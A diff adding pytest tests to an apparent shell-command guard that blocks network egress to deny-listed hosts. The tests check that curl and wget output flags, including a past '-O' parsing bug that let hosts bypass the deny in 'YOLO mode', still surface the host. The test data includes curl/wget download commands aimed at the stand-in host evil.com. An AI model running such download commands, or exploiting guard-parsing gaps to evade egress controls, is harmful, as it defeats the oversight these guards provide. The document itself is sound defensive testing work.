@@ -199,6 +199,45 @@ def test_output_flag_filename_not_treated_as_host():
     ).level is GuardLevel.SAFE
 
 
+@pytest.mark.parametrize(
+    "command",
+    [
+        # Flags that genuinely consume a filename: the URL host still follows.
+        "curl -o saved.txt https://evil.com/file",
+        "curl --output saved.txt https://evil.com/file",
+        "wget -O saved.txt https://evil.com/file",
+        "wget --output-document saved.txt https://evil.com/file",
+        # curl's -O / --remote-name are BOOLEAN — they take NO filename, so the
+        # parser must not skip the following URL (regression: it did, letting the
+        # host escape the deny and be permitted in YOLO mode).
+        "curl -O https://evil.com/file",
+        "curl --remote-name https://evil.com/file",
+    ],
+)
+def test_denied_host_detected_across_all_output_flags(command):
+    """Every curl/wget output-flag spelling must still surface the denied host.
+
+    Option arity is per-program: skipping the next token as a filename only for
+    flags that truly take one keeps the URL visible so the deny fires.
+    """
+    v = inspect_command(command, _net(deny=["evil.com"]))
+    assert v.level is GuardLevel.BLOCKED, command
+    assert "denies egress" in v.reason
+
+
+def test_curl_output_flag_truly_consumes_host_looking_filename():
+    """A real filename-consuming flag still swallows its argument.
+
+    `report.com` is the OUTPUT FILE (deny-listed on purpose); the only egress
+    target is the allowed `example.com`, so the command stays SAFE — proving the
+    filename after `-o` is consumed and never mistaken for a host.
+    """
+    v = inspect_command(
+        "curl -o report.com https://example.com/f", _net(deny=["report.com"])
+    )
+    assert v.level is GuardLevel.SAFE
+
+
 def test_no_policy_leaves_curl_unchanged():
     """No policy (or an inert one) must not change existing behaviour."""
     assert inspect_command("curl https://evil.com").level is GuardLevel.SAFE
